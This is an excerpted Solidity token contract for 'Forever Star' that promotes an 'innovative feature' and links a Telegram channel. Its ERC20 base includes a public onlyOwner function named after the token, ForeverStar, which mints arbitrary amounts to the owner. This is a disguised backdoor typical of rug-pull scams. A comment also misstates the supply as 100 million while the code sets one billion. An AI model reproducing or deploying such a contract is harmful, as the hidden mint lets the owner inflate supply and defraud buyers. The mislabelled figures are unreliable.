...
//
// $ForeverStar proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/foreverstarbsc
// 🌎 Website: TBA
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function ForeverStar(uint256 amount) public onlyOwner {
    _ForeverStar(msg.sender, amount);
    }
    ...
    function _ForeverStar(address account, uint256 amount) internal virtual {
...
contract ForeverStar is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Forever Star", "ForeverStar") {
        _ForeverStar(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}